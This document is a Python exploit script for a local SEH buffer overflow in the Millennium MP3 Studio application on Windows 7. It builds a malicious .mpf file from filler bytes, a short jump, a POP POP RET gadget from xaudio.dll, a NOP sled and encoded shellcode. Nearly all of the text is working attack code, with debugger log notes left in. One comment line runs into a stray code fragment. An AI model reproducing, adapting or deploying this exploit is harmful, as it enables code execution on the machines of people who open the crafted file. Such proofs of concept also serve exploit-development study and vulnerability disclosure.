from struct import *

# Date : 9/20/2019
#   Victim system : Windows 7
#
#   Exploit summary: There is a SEH overflow in the Millenium MP3 studio application,
#   an attacker can locally import a malicious .mpf file which can result in code execution

# This is a local SEH overflow exploit


malicious_file = "evil.mpf"

# Log data, item 36
# Address=0BADF00D
# Message=    SEH record (nseh field) at 0x0018f948 overwritten with normal pattern : 0x31684630 (offset 4112), followed by 1712 bytes of cyclic data after the handler

seh = pack ('<I',  0x10014E98) # POP POP RET from xaudio.dll - using !mona seh -n
nseh = pack ('<I', 0x909032EB) # Short jump 

shellcode = (
"\xdb\xc8\xba\x50\xf4\xd9\x51\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x44\x16\x2c\xad\x8c\x54"
"\xcf\x4e\x4c\x39\x59\xab\x7d\x79\x3d\xbf\x2d\x49\x35\xed\xc1"
"\x22\x1b\x06\x52\x46\xb4\x29\xd3\xed\xe2\x04\xe4\x5e\xd6\x07"
"\x66\x9d\x0b\xe8\x57\x6e\x5e\xe9\x90\x93\x93\xbb\x49\xdf\x06"
"\x2c\xfe\x95\x9a\xc7\x4c\x3b\x9b\x34\x04\x3a\x8a\xea\x1f\x65"
"\x0c\x0c\xcc\x1d\x05\x16\x11\x1b\xdf\xad\xe1\xd7\xde\x67\x38"
"\x17\x4c\x46\xf5\xea\x8c\x8e\x31\x15\xfb\xe6\x42\xa8\xfc\x3c"
"\x39\x76\x88\xa6\x99\xfd\x2a\x03\x18\xd1\xad\xc0\x16\x9e\xba"
"\x8f\x3a\x21\x6e\xa4\x46\xaa\x91\x6b\xcf\xe8\xb5\xaf\x94\xab"
"\xd4\xf6\x70\x1d\xe8\xe9\xdb\xc2\x4c\x61\xf1\x17\xfd\x28\x9f"
"\xe6\x73\x57\xed\xe9\x8b\x58\x41\x82\xba\xd3\x0e\xd5\x42\x36"
"\x6b\x29\x09\x1b\xdd\xa2\xd4\xc9\x5c\xaf\xe6\x27\xa2\xd6\x64"
"\xc2\x5a\x2d\x74\xa7\x5f\x69\x32\x5b\x2d\xe2\xd7\x5b\x82\x03"
"\xf2\x3f\x45\x90\x9e\x91\xe0\x10\x04\xee")

payload = "A" * 4112
payload += nseh
payload += seh
payload += "\x90" * 100
payload += shellcode

# Log data, item 24
# Address=10014E98
# Message=  0x10014e98 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [xaudio.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v3.0.7.0 (c:\mp3-millennium\xaudio.dllpayload_execution = open(malicious_file, 'w+')

try:
    print("[x] Opening the malicious file")
    payload_execution = open(malicious_file, "w+")
    print("[x] Creating a file named", malicious_file) 
    payload_execution.write(payload)
    print("[x] Adding payload to the malicious file")
    payload_execution.close()
    print("[x] Sending junk")
    print("[x] Sending POP POP RET via controlled SEH handler")
    print("[x] Jumping to shellcode")
except:
    print("[!] Error running the exploit")
